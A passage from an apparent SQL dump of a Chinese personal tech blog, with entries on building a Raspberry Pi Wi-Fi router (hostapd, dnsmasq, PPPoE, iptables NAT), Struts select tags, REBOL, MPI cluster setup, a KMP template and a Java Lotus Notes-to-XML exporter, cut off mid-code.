28px;\">http://jaist.dl.sourceforge.net/project/xbian/release/XBian_1.0_Beta_2.7z</span></div><div>Wifi共享专家<a href=\"http://www.onlinedown.net/soft/259534.htm\" rel=\"nofollow\" style=\"line-height: 28px;\">http://www.onlinedown.net/soft/259534.htm</a></div><div>1.3 准备环境</div><div>第一步：解压缩Xbian镜像，使用镜像工具写入SD卡</div><div><div><img alt=\"用树莓派做无线路由器共享拨号上网 - hankjin - 云水居\" src=\"/static/163/140456013478824492.png\" style=\"margin: 0 10px 0 0;\" title=\"用树莓派做无线路由器共享拨号上网 - hankjin - 云水居\" /></div>&nbsp;<span style=\"line-height: 28px;\">第二步：使用Wifi共享专家，共享电脑的拨号，生成AP</span></div><div><div><img alt=\"用树莓派做无线路由器共享拨号上网 - hankjin - 云水居\" src=\"/static/163/2227030015834895302.png\" style=\"margin: 0 10px 0 0;\" title=\"用树莓派做无线路由器共享拨号上网 - hankjin - 云水居\" /></div>&nbsp;<span style=\"line-height: 28px;\">第三步：连接树莓派，开机</span></div><div>插入第一步的SD卡，HDMI转VGA连接树莓和显示器，插入无线网卡和USB键盘，电源线连接电源</div><div>第四步：配置树莓派网络</div><div>启动XBMC成功后，按键盘的下方向键，选择左下脚第二个图标，按回车，出现菜单，选第一个Exit</div><div><span style=\"line-height: 28px;\">进入Xbian配置界面：Settings-&gt;Network-&gt;wlan0-&gt;DHCP-&gt;Scan，选中第二步共享的AP，连接成功后，按Ctrl+C退出。</span></div><div>使用sudo apt-get update，确认网络连接成功</div><div>第五步：设置HDMI输出</div><div>Xbian重启后很容易黑屏，需要设置强制HDMI</div><div>sudo xbian-config</div><div>Settings-&gt;System-&gt;Video Output-&gt;Force HDMI</div><div><br /></div><div><div>2. 制作路由器</div><div>2.1 路由软件hostapd，xbian的官方源里有hostapd，但是不支持我的无线网卡驱动，所以要用第三方的hostapd版本，无线网卡的版本查看方法(sudo lsusb)</div><div>输出示例：Bus 001 Device 004: ID 0bda:8176 Realtek Semiconductor Corp. RTL8188CUS 802.11n WLAN Adapter</div><div>安装步骤：</div><div>wget https://codeload.github.com/jenssegers/RTL8188-hostapd/tar.gz/v1.1</div><div>tar v1.1</div><div>cd RTL8188-hostapd-1.1/hostapd</div><div>sudo make</div><div>sudo make install</div><div>sudo vi /etc/hostapd/hostapd.conf</div><div><div># Basic configuration</div><div>interface=wlan0</div><div>ssid=Hank_Wifi</div><div>channel=11</div><div><br /></div><div># WPA and WPA2 configuration</div><div>macaddr_acl=0</div><div>auth_algs=3</div><div>ignore_broadcast_ssid=0</div><div>wpa=2</div><div>wpa_passphrase=hankjinPassword</div><div>wpa_key_mgmt=WPA-PSK</div><div>wpa_pairwise=TKIP</div><div>rsn_pairwise=CCMP</div><div><br /></div><div># Hardware configuration</div><div>driver=rtl871xdrv</div><div>ieee80211n=1</div><div>hw_mode=g</div><div>device_name=RTL8188CUS</div><div>manufacturer=Realtek</div></div><div>sudo /etc/init.d/hostapd restart</div><div><br /></div><div>2.2 DHCP&amp;DNS软件</div><div>网上很多人用isc-dhcp-server，这里用的是dnsmasq，安装方法很简单，配置更简单：</div><div>sudo apt-get install dnsmasq</div><div>sudo vi /etc/dnsmasq.conf</div><div>#无线网卡</div><div>interface=wlan0</div><div>#分配的IP段</div><div>dhcp-range=192.168.1,50,192.168.1.150,12h</div><div>#网关</div><div>dhcp-option=3,192.168.1.1</div><div>#DNS</div><div>dhcp-option=6,8.8.8.8</div><div>sudo /etc/init.d/dnsmasq restart</div><div><p lang=\"en-US\" style=\"margin: 0in; font-size: 10.0pt;\"><span style=\"line-height: 28px; font-size: 16px;\">3. 拨号上网</span></p><p lang=\"en-US\" style=\"margin: 0in; font-size: 10.0pt;\"><span style=\"line-height: 28px; font-size: 16px;\">sudo apt-get install pppoeconf</span></p><p lang=\"en-US\" style=\"margin: 0in; font-size: 10.0pt;\"><span style=\"line-height: 28px; font-size: 16px;\">sudo pppoeconf</span></p><p lang=\"en-US\" style=\"margin: 0in;\">输入用户名和密码，其它全部默认即可。</p><p lang=\"en-US\" style=\"margin: 0in;\">如果连接不上，可以尝试修改/etc/ppp/options，将lcp-echo-failure的值改为40</p></div><div>4. 设置转发</div></div><div>sudo ifconfig wlan0 192.168.1.1 netmask 255.255.255.0</div><div>sudo sh -c \"echo 1 &gt; /proc/sys/net/ipv4/ip_forward\"</div><div>sudo iptables -t nat -A POSTROUTING -o ppp1 -j MASQUERADE</div><div><br /></div><div>5. 享受成果</div><div>从笔记本上找到HankWiFi，输入密码即可</div><div><br /></div><div>6. 全自动</div><div>6.1 将dnsmasq和hostapd服务设置自动启动</div><div>sudo xbian-config</div><div>Services</div><div>6.2 设置静态IP</div><div>sudo vi /etc/network/interface，将wlan0相关的部分改为</div><div><div>allow-hotplug wlan0</div><div>iface wlan0 inet static</div><div>address 192.168.1.1</div><div>netmask 255.255.255.0</div></div><div>6.3 设置转发</div><div>sudo vi /etc/rc.local</div><div><div>iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</div><div>iptables -A FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</div><div><span style=\"line-height: 28px;\">iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT &nbsp; &nbsp;</span></div><div>iptables -t nat -A POSTROUTING -o ppp1 -j MASQUERADE &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</div><div>exit 0</div></div>',1,1,1,0,0,0,'1. 准备工作1.1 硬件准备树莓派：HDMI转VGA接口：USB键盘液晶显示器无线网卡：EP-8508GS电脑（开发机，带Wifi）：Win7读卡器：拨号上网帐户与网线：1.2 软件准备写镜像工具 http://jaist.dl.sourceforge.net/project/win32diskimager/Archive/win32diskimager-v0.9-binary.zipXbian镜像&nbsp;http://jaist.dl.sourceforge.net/project/xbian/release/XBian_1.0_Beta_2.7zWifi共享专家http://www.onlinedown.net/soft/259534.htm1.3 准备环境第一步：解压缩Xbian镜像，使用镜像工具写入SD卡&nbsp;第二步：使用Wifi共享专家，共享电脑的拨号，生成AP&nbsp;第三步：连接树莓派，开机插入第一步的SD卡，HDMI转VGA连接树莓和显示器，插入无线网卡和USB键盘，电源线连接电源第四步：配置树莓派网络启动XBMC成功后，按键盘的下方向键，选择左下脚第二个图标，按回车，出现菜单，选第一个Exit进入Xbian配置界面：Settings-&gt;Network-&gt;wlan0-&gt;DHCP-&gt;Scan，选中第二步共享的AP，连接成功后，按Ctrl+C退出。使用sudo apt-get update，确认网络连接成功第五步：设置HDMI输出Xbian重启后很容易黑屏，需要设置强制HDMIsudo xbian-configSettings-&gt;System-&gt;Video Output-&gt;Force HDMI2. 制作路由器2.1 路由软件hostapd，xbian的官方源里有hostapd，但是不支持我的无线网卡驱动，所以要用第三方的hostapd版本，无线网卡的版本查看方法(sudo lsusb)输出示例：Bus 001 Device 004: ID 0bda:8176 Realtek Semiconductor Corp. RTL8188CUS 802.11n WLAN Adapter安装步骤：wget https://codeload.github.com/jenssegers/RTL8188-hostapd/tar.gz/v1.1tar v1.1cd RTL8188-hostapd-1.1/hostapdsudo makesudo make installsudo vi /etc/hostapd/hostapd.conf# Basic configurationinterface=wlan0ssid=Hank_Wifichannel=11# WPA and WPA2 configurationmacaddr_acl=0auth_algs=3ignore_broadcast_ssid=0wpa=2wpa_passphrase=hankjinPasswordwpa_key_mgmt=WPA-PSKwpa_pairwise=TKIPrsn_pairwise=CCMP# Hardware configurationdriver=rtl871xdrvieee80211n=1hw_mode=gdevice_name=RTL8188CUSmanufacturer=Realteksudo /etc/init.d/hostapd restart2.2 DHCP&amp;DNS软件网上很多人用isc-dhcp-server，这里用的是dnsmasq，安装方法很简单，配置更简单：sudo apt-get install dnsmasqsudo vi /etc/dnsmasq.conf#无线网卡interface=wlan0#分配的IP段dhcp-range=192.168.1,50,192.168.1.150,12h#网关dhcp-option=3,192.168.1.1#DNSdhcp-option=6,8.8.8.8sudo /etc/init.d/dnsmasq restart3. 拨号上网sudo apt-get install pppoeconfsudo pppoeconf输入用户名和密码，其它全部默认即可。如果连接不上，可以尝试修改/etc/ppp/options，将lcp-echo-failure的值改为404. 设置转发sudo ifconfig wlan0 192.168.1.1 netmask 255.255.255.0sudo sh -c \"echo 1 &gt; /proc/sys/net/ipv4/ip_forward\"sudo iptables -t nat -A POSTROUTING -o ppp1 -j MASQUERADE5. 享受成果从笔记本上找到HankWiFi，输入密码即可6. 全自动6.1 将dnsmasq和hostapd服务设置自动启动sudo xbian-configServices6.2 设置静态IPsudo vi /etc/network/interface，将wlan0相关的部分改为allow-hotplug wlan0iface wlan0 inet staticaddress 192.168.1.1netmask 255.255.255.06.3 设置转发sudo vi /etc/rc.localiptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;iptables -A FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT &nbsp; &nbsp;iptables -t nat -A POSTROUTING -o ppp1 -j MASQUERADE &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;exit 0','',0,'',0,'','zinnia/_entry_detail.html','entry_detail.html'),(351,'在struts中使用&lt;html:select&gt;','3373193720093121414573',2,'2009-04-12 01:04:14',NULL,'2009-04-12 01:04:14','2014-07-13 18:57:26','主要用到html:optionsCollection标签和LabelValueBean类, 也就是两块: Action中populate值, jsp中用Tag显示<br />1.Tag<br />&lt;html:select property=\"productId\"&gt;<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &lt;html:optionsCollection name=\"productList\"/&gt;<br />&lt;/html:select&gt;<br /><br />2.Action<br />HashSet&lt;LabelValueBean&gt; hs = new HashSet&lt;LabelValueBean&gt;();<br />ProductDAO dao = new ProductDAO();<br />List&lt;Product&gt; products = dao.findAll();<br />for(Product product:products){<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp; hs.add(new LabelValueBean(product.getName(), product.getId()));<br />}<br />request.setAttribute(\"productList\", hs);<br /><br />3. 不需要Action, 直接使用html:option写死<br />&lt;html:select property=\"type\"&gt;<br />&nbsp;&nbsp;&nbsp; &lt;html:option value=\"F\"&gt;产品&lt;/html:option&gt;<br />&nbsp;&nbsp;&nbsp; &lt;html:option value=\"S\"&gt;步骤&lt;/html:option&gt;<br />&nbsp;&nbsp;&nbsp; &lt;html:option value=\"P\"&gt;配件&lt;/html:option&gt;<br />&lt;/html:select&gt;<br />',1,1,1,0,0,0,'主要用到html:optionsCollection标签和LabelValueBean类, 也就是两块: Action中populate值, jsp中用Tag显示1.Tag&lt;html:select property=\"productId\"&gt;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &lt;html:optionsCollection name=\"productList\"/&gt;&lt;/html:select&gt;2.ActionHashSet&lt;LabelValueBean&gt; hs = new HashSet&lt;LabelValueBean&gt;();ProductDAO dao = new ProductDAO();List&lt;Product&gt; products = dao.findAll();for(Product product:products){&nbsp;&nbsp;&nbsp; &nbsp;&nbsp; hs.add(new LabelValueBean(product.getName(), product.getId()));}request.setAttribute(\"productList\", hs);3. 不需要Action, 直接使用html:option写死&lt;html:select property=\"type\"&gt;&nbsp;&nbsp;&nbsp; &lt;html:option value=\"F\"&gt;产品&lt;/html:option&gt;&nbsp;&nbsp;&nbsp; &lt;html:option value=\"S\"&gt;步骤&lt;/html:option&gt;&nbsp;&nbsp;&nbsp; &lt;html:option value=\"P\"&gt;配件&lt;/html:option&gt;&lt;/html:select&gt;','',0,'j2ee',0,'','zinnia/_entry_detail.html','entry_detail.html'),(352,'REBOL - VID','3373193720084122146546',2,'2008-05-12 14:01:46',NULL,'2008-05-12 14:01:46','2014-07-13 18:57:26','&gt;&gt; a: layout[button \"B\" [view b]<br />[&nbsp;&nbsp;&nbsp; button \"C\" [view c]<br />[&nbsp;&nbsp;&nbsp; ]<br />&gt;&gt; b: layout[button \"A\"[view a]<br />[&nbsp;&nbsp;&nbsp; button \"C\" [view c]<br />[&nbsp;&nbsp;&nbsp; ]<br />&gt;&gt; c: layout[button \"A\"[view a]<br />[&nbsp;&nbsp;&nbsp; button \"B\"[view b]<br />[&nbsp;&nbsp;&nbsp; ]<br />&gt;&gt; view a',1,1,1,0,0,0,'&gt;&gt; a: layout[button \"B\" [view b][&nbsp;&nbsp;&nbsp; button \"C\" [view c][&nbsp;&nbsp;&nbsp; ]&gt;&gt; b: layout[button \"A\"[view a][&nbsp;&nbsp;&nbsp; button \"C\" [view c][&nbsp;&nbsp;&nbsp; ]&gt;&gt; c: layout[button \"A\"[view a][&nbsp;&nbsp;&nbsp; button \"B\"[view b][&nbsp;&nbsp;&nbsp; ]&gt;&gt; view a','',0,'other',0,'','zinnia/_entry_detail.html','entry_detail.html'),(353,'在mbuntu上使用MPI','33731937201081752016767',2,'2010-09-17 17:26:28',NULL,'2010-09-17 17:26:28','2014-07-13 18:57:26','MPI在ubuntu10.04版本上的包名称为libmpich2-dev<br />sudo apt-get install libmpich2-dev<br />单节点<br />touch .mpd.conf<br />chmod 600 .mpd.conf<br />mpdboot<br />mpicc test.c -o test<br />mpirun -n 3 ./test<br />多节点<br />节点1:node1<br />cd .ssh<br />ssh-keygen -t rsa<br />scp id_rsa.pub hankjin@node2:/home/hankjin/.ssh/authorized_keys<br />cd ..<br />节点2: node2<br />touch .mpd.conf<br />chmod 600 .mpd.conf<br />cd .ssh<br />ssh-keygen -t rsa<br />scp id_rsa.pub hankjin@node1:/home/hankjin/.ssh/authorized_keys<br />cd ..<br />启动并测试mpd(节点1)上<br />cat&gt; mpd.hosts&lt;&lt;EOF<br />node1<br />node2<br />EOF<br />scp test hankjin@node2:/home/hankjin<br />mpdboot -n 2 -f mpd.hosts<br />mpdtrace<br />运行程序<br />mpirun -n 3 -host node1 ./test : -n 4 -host node2 ./test<br />[1/7] on node1<br />[0/7] on node1<br />[3/7] on node2<br />[4/7] on node2<br />[2/7] on node1<br />[6/7] on node2<br />[5/7] on node2<br />退出mpi<br />mpdallexit<br /><br />测试程序：<br />#include &lt;mpi.h&gt;<br />#include &lt;stdio.h&gt;<br /><br />char name[20];<br />int main(int argc, char*argv[]){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int x,n,nameLen;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MPI_Init(&amp;argc, &amp;argv);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MPI_Comm_rank(MPI_COMM_WORLD,&amp;x);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MPI_Comm_size(MPI_COMM_WORLD,&amp;n);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MPI_Get_processor_name(name, &amp;nameLen);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf(\"[%d/%d] on %s\\n\", x,n, name);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MPI_Finalize();<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return 0;<br />}<br />常见问题：<br />ssh没有自动连通',1,1,1,0,0,0,'MPI在ubuntu10.04版本上的包名称为libmpich2-devsudo apt-get install libmpich2-dev单节点touch .mpd.confchmod 600 .mpd.confmpdbootmpicc test.c -o testmpirun -n 3 ./test多节点节点1:node1cd .sshssh-keygen -t rsascp id_rsa.pub hankjin@node2:/home/hankjin/.ssh/authorized_keyscd ..节点2: node2touch .mpd.confchmod 600 .mpd.confcd .sshssh-keygen -t rsascp id_rsa.pub hankjin@node1:/home/hankjin/.ssh/authorized_keyscd ..启动并测试mpd(节点1)上cat&gt; mpd.hosts&lt;&lt;EOFnode1node2EOFscp test hankjin@node2:/home/hankjinmpdboot -n 2 -f mpd.hostsmpdtrace运行程序mpirun -n 3 -host node1 ./test : -n 4 -host node2 ./test[1/7] on node1[0/7] on node1[3/7] on node2[4/7] on node2[2/7] on node1[6/7] on node2[5/7] on node2退出mpimpdallexit测试程序：#include &lt;mpi.h&gt;#include &lt;stdio.h&gt;char name[20];int main(int argc, char*argv[]){&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int x,n,nameLen;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MPI_Init(&amp;argc, &amp;argv);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MPI_Comm_rank(MPI_COMM_WORLD,&amp;x);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MPI_Comm_size(MPI_COMM_WORLD,&amp;n);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MPI_Get_processor_name(name, &amp;nameLen);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf(\"[%d/%d] on %s\\n\", x,n, name);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MPI_Finalize();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return 0;}常见问题：ssh没有自动连通','',0,'unix',0,'','zinnia/_entry_detail.html','entry_detail.html'),(354,'显示器屏幕闪烁','33731937200931092613845',2,'2009-04-10 21:26:13',NULL,'2009-04-10 21:26:13','2014-07-13 18:57:26','42寸电视显示器, 连接主机, 屏幕不断闪烁. 第一次换了一个主机, 问题解决了, 怀疑是信号干扰的缘故.<br />第二次又出现了同样的问题, 换主机不能用, 换笔记本正常. 继续不解中, 然后找来一个插线板, 把主机和显示器的电源都接到同一个插线板上, 问题解决.<br />结论: 显示器和主机的工作电源不一致(不同的插座的电源不同), 换同一个插线板后, 工作电源一致.<br /><br />结论: 排除所有的出错可能.<br />',1,1,1,0,0,0,'42寸电视显示器, 连接主机, 屏幕不断闪烁. 第一次换了一个主机, 问题解决了, 怀疑是信号干扰的缘故.第二次又出现了同样的问题, 换主机不能用, 换笔记本正常. 继续不解中, 然后找来一个插线板, 把主机和显示器的电源都接到同一个插线板上, 问题解决.结论: 显示器和主机的工作电源不一致(不同的插座的电源不同), 换同一个插线板后, 工作电源一致.结论: 排除所有的出错可能.','',0,'',0,'','zinnia/_entry_detail.html','entry_detail.html'),(355,'KMP模板','3373193720108910244432',2,'2010-09-09 10:02:44',NULL,'2010-09-09 10:02:44','2014-07-13 18:57:26','void preKmp(char *src, int m, int *rule){<br />&nbsp; int i=0,j=-1;<br />&nbsp; rule[0]=j;<br />&nbsp; while(i&lt;m){<br />&nbsp;&nbsp;&nbsp; while(j!=-1 &amp;&amp; src[j] != src[i])<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; j=rule[j];<br />&nbsp;&nbsp;&nbsp; i++,j++;<br />&nbsp;&nbsp;&nbsp; if(j&gt;=m)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; rule[i]=rule[j-1];<br />&nbsp;&nbsp;&nbsp; else<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; rule[i]=j;<br />&nbsp; }<br />}<br />void kmp(char *src, int m, char *dest, int n){<br />&nbsp; int rule[MAXN];<br />&nbsp; preKmp(src,m,rule);<br />&nbsp; int i=0, j=0;<br />&nbsp; while(i&lt;n){<br />&nbsp;&nbsp;&nbsp; while(j!=-1 &amp;&amp; src[j] != dest[i]){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; j = rule[j];<br />&nbsp;&nbsp;&nbsp; }<br />&nbsp;&nbsp;&nbsp; i++,j++;<br />&nbsp;&nbsp;&nbsp; if(j==m){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //print ans<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; j=rule[j];<br />&nbsp;&nbsp;&nbsp; }<br />&nbsp; }<br />}',1,1,1,0,0,0,'void preKmp(char *src, int m, int *rule){&nbsp; int i=0,j=-1;&nbsp; rule[0]=j;&nbsp; while(i&lt;m){&nbsp;&nbsp;&nbsp; while(j!=-1 &amp;&amp; src[j] != src[i])&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; j=rule[j];&nbsp;&nbsp;&nbsp; i++,j++;&nbsp;&nbsp;&nbsp; if(j&gt;=m)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; rule[i]=rule[j-1];&nbsp;&nbsp;&nbsp; else&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; rule[i]=j;&nbsp; }}void kmp(char *src, int m, char *dest, int n){&nbsp; int rule[MAXN];&nbsp; preKmp(src,m,rule);&nbsp; int i=0, j=0;&nbsp; while(i&lt;n){&nbsp;&nbsp;&nbsp; while(j!=-1 &amp;&amp; src[j] != dest[i]){&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; j = rule[j];&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp;&nbsp; i++,j++;&nbsp;&nbsp;&nbsp; if(j==m){&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //print ans&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; j=rule[j];&nbsp;&nbsp;&nbsp; }&nbsp; }}','',0,'other',0,'','zinnia/_entry_detail.html','entry_detail.html'),(356,'把Lotus Notes的nsf数据库文档转换成xml文件','3373193720085321439261',2,'2008-06-03 14:14:39',NULL,'2008-06-03 14:14:39','2014-07-13 18:57:26','<p>需要设置的属性有</p>\n<p>1：数据库文件的名字（放在Notes的默认数据库目录下，如C:\\notes\\data）</p>\n<p>2：要转换的View（邮件的收件箱和发件箱分别为$Inbox和$Sent）</p>\n<p>3：转换生成的xml文件存放路径（以\\\\结束，如D:\\\\data\\\\）</p>\n<p>注：Lotus Notes7下测试通过</p>\n<p>package hjz;</p>\n<p>import java.io.File;<br />import java.util.List;<br />import java.util.Vector;</p>\n<p>import lotus.domino.Database;<br />import lotus.domino.Document;<br />import lotus.domino.DxlExporter;<br />import lotus.domino.Item;<br />import lotus.domino.NotesFactory;<br />import lotus.domino.NotesThread;<br />import lotus.domino.Session;<br />import lotus.domino.Stream;<br />import lotus.domino.View;<br />/**<br />&nbsp;* Convert Notes DB to xml<br />&nbsp;* @author hankjin<br />&nbsp;* this method can convert notes db to xml files<br />&nbsp;*/<br />public class Notes2Xml {<br />&nbsp;public static final int TYPE_VIEWNAME = 1;<br />&nbsp;public static final int TYPE_VIEWINDEX = 2;<br />&nbsp;//Notes related variable<br />&nbsp;Session s;<br />&nbsp;Database db;<br />&nbsp;View inbox;<br />&nbsp;DxlExporter dxl;<br />&nbsp;<br />&nbsp;//special variable<br />&nbsp;String dbName;<br />&nbsp;String xmlPath;<br />&nbsp;String viewName;<br />&nbsp;int viewIndex;<br />&nbsp;int viewType;<br />&nbsp;<br />&nbsp;public Notes2Xml(){<br />&nbsp;&nbsp;<br />&nbsp;}<br />&nbsp;/**<br />&nbsp; * @param args<br />&nbsp; */<br />&nbsp;public static void main(String[] args) throws Exception{<br />&nbsp;&nbsp;// TODO Auto-generated method stub<br />&nbsp;&nbsp;Notes2Xml tool = new Notes2Xml();<br />&nbsp;&nbsp;tool.setDbName(\"hjz_test.nsf\");<br />&nbsp;&nbsp;tool.setXmlPath(\"D:\\\\data\\\\\");<br />&nbsp;&nbsp;tool.setViewType(Notes2Xml.TYPE_VIEWINDEX);<br />&nbsp;&nbsp;tool.setViewIndex(0);<br />&nbsp;&nbsp;tool.view2Xml();<br />&nbsp;}<br />&nbsp;/**<br />&nbsp; * Convert a view 2 xml<br />&nbsp; * @throws Exception<br />&nbsp; */<br />&nbsp;public void view2Xml() throws Exception{<br />&nbsp;&nbsp;if(getInbox()){<br />&nbsp;&nbsp;&nbsp;dxl = s.createDxlExporter();<br />&nbsp;&nbsp;&nbsp;dxl.setForceNoteFormat(false);<br />&nbsp;&nbsp;&nbsp;dxl.setOutputDOCTYPE(false);<br />&nbsp;&nbsp;&nbsp;dxl.setConvertNotesBitmapsToGIF(true);<br />&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;List&lt;Document&gt; docs = new Vector&lt;Document&gt;();<br />&nbsp;&nbsp;&nbsp;Document doc = inbox.getFirstDocument();</p>\n<p>&nbsp;&nbsp;&nbsp;int count = 0;<br />&nbsp;&nbsp;&nbsp;do{<br />&nbsp;&nbsp;&nbsp;&nbsp;docs.add(doc);<br />&nbsp;&nbsp;&nbsp;}while((doc = inbox.getNextDocument(doc)) != null);<br />&nbsp;&nbsp;&nbsp;for(Document xml : docs){<br />&nbsp;&nbsp;&nbsp;&nbsp;if(doc2Xml(xml, ++count) == false){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(\"Failed:\"+count);<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;}<br />&nbsp;}<br />&nbsp;/**<br />&nbsp; * convert a document to xml<br />&nbsp; * @param doc<br />&nbsp; * @param index<br />&nbsp; * @return<br />&nbsp; */<br />&nbsp;public boolean doc2Xml(Document doc, int index){<br />&nbsp;&nbsp;try{<br />&nbsp;&nbsp;&nbsp;String subject = doc.getItemValueString(\"Subject\");<br />&nbsp;&nbsp;&nbsp;subject = subject.replaceAll(\"[/|:|*|?|\\\"|&lt;|&gt;|.|\\r|\\n]\", \"_\");<br />&nbsp;&nbsp;&nbsp;if(subject.length() &gt; 200){<br />&nbsp;&nbsp;&nbsp;&nbsp;subject = subject.substring(0, 200);<br />&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;System.out.println(index + subject);<br />&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;Stream stream = s.createStream();<br />&nbsp;&nbsp;&nbsp;if(stream.open(xmlPath + index + \"_\" + subject + \".xml\")){<br />&nbsp;&nbsp;&nbsp;&nbsp;stream.writeText(dxl.exportDxl(doc));<br />&nbsp;&nbsp;&nbsp;&nbsp;stream.close();<br />&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;return true;<br />&nbsp;&nbsp;}<br />&nbsp;&nbsp;catch(Exception ioe){<br />&nbsp;&nbsp;&nbsp;ioe.printStackTrace();<br />&nbsp;&nbsp;&nbsp;return false;<br />&nbsp;&nbsp;}<br />&nbsp;}<br />&nbsp;/**<br />&nbsp; * List all views in the database.<br />&nbsp; */<br />&nbsp;public void listView() throws Exception{<br />&nbsp;&nbsp;System.out.println(\"==================Views==============\");<br />&nbsp;&nbsp;<br />&nbsp;&nbsp;Vector&lt;View&gt; views = db.getViews();<br />&nbsp;&nbsp;for(View view : views){<br />&nbsp;&nbsp;&nbsp;System.out.println(view.getName());<br />&nbsp;&nbsp;&nbsp;byte []tmp = view.getName().getBytes();<br />&nbsp;&nbsp;&nbsp;for(int j = 0; j &lt; tmp.length; j ++){<br />&nbsp;&nbsp;&nbsp;&nbsp;System.out.print(tmp[j]);<br />&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;System.out.println();<br />&nbsp;&nbsp;}<br />&nbsp;&nbsp;System.out.println(\"=================End Views==============\");<br />&nbsp;}<br />&nbsp;/**<br />&nbsp; * list all columns of a document <br />&nbsp; * @param doc<br />&nbsp; * @throws Exception<br />&nbsp; */<br />&nbsp;public void listColumns(Document doc)throws Exception{<br />&nbsp;&nbsp;//items: Form, SendTo,CopyTo,From,Subject,DeliveryPriority<br />&nbsp;&nbsp;List&lt;Item&gt; items = doc.getItems();<br />&nbsp;&nbsp;for(Item item : items ){<br />&nbsp;&nbsp;&nbsp;System.out.print(item.getName());<br />&nbsp;&nbsp;&nbsp;String temp = doc.getItemValue(item.getName()).toString();<br />&nbsp;&nbsp;&nbsp;System.out.println(temp);<br />&nbsp;&nbsp;}<br />&nbsp;&nbsp;System.out.println(doc.getEmbeddedObjects());<br />&nbsp;}<br />&nbsp;private boolean getInbox(){<br />&nbsp;&nbsp;System.out.println(\"INFO: begin get inbox\");<br />&nbsp;&nbsp;NotesThread.sinitThread(); // start thread<br />&nbsp;&nbsp;try{<br />&nbsp;&nbsp;&nbsp;s = NotesFactory.createSession();<br />&nbsp;&nbsp;&nbsp;System.out.println(\"INFO:&nbsp; session got\");<br />&nbsp;&nbsp;&nbsp;db = s.getDatabase(s.getServerName(),dbName);<br />&nbsp;&nbsp;&nbsp;System.out.println(\"INFO:&nbsp; db got\");<br />&nbsp;&nbsp;&nbsp;if(viewType == TYPE_VIEWNAME)<br />&nbsp;&nbsp;&nbsp;&nbsp;inbox = db.getView(viewName);<br />&nbsp;&nbsp;&nbsp;else if(viewType == TYPE_VIEWINDEX)<br 